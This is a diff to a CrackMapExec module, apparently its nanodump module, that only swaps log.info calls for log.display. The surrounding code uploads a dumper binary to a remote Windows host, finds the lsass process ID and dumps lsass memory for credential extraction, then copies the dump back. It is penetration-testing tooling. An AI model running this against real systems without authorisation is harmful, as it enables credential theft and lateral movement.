@@ -68,10 +68,10 @@ class CMEModule:
         if self.useembeded == True:
             with open(self.nano_path + self.nano, 'wb') as nano:
                 if connection.os_arch == 32 and context.protocol == 'smb':
-                    context.log.info("32-bit Windows detected.")
+                    context.log.display("32-bit Windows detected.")
                     nano.write(self.nano_embedded32)
                 elif connection.os_arch == 64 and context.protocol == 'smb':
-                    context.log.info("64-bit Windows detected.")
+                    context.log.display("64-bit Windows detected.")
                     nano.write(self.nano_embedded64)
                 elif context.protocol == 'mssql':
                     nano.write(self.nano_embedded64)
@@ -89,7 +89,7 @@ class CMEModule:
         else:
             with open(self.nano_path + self.nano, 'rb') as nano:
                 try:
-                    context.log.info('Copy {} to {}'.format(self.nano, self.tmp_dir))
+                    context.log.display('Copy {} to {}'.format(self.nano, self.tmp_dir))
                     exec_method = MSSQLEXEC(connection.conn)
                     exec_method.put_file(nano.read(), self.tmp_dir + self.nano)
                     if exec_method.file_exists(self.tmp_dir + self.nano):
@@ -102,13 +102,13 @@ class CMEModule:
     
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.info('Getting lsass PID {}'.format(command))
+        context.log.display('Getting lsass PID {}'.format(command))
         p = connection.execute(command, True)
         pid = p.split(',')[1][1:-1]
         timestamp = datetime.today().strftime('%Y%m%d_%H%M')
         nano_log_name = '{}.log'.format(timestamp)
         command = self.tmp_dir + self.nano + ' --pid ' + pid + ' --write ' + self.tmp_dir + nano_log_name
-        context.log.info('Executing command {}'.format(command))
+        context.log.display('Executing command {}'.format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
         dump = False
@@ -119,7 +119,7 @@ class CMEModule:
             context.log.error('Process lsass.exe error on dump, try with verbose')
         
         if dump:
-            context.log.info('Copying {} to host'.format(nano_log_name))
+            context.log.display('Copying {} to host'.format(nano_log_name))
             filename = '{}{}_{}_{}.log'.format(self.dir_result,connection.hostname,connection.os_arch,connection.domain)
             if context.protocol == 'smb':
                 with open(filename, 'wb+') as dump_file:
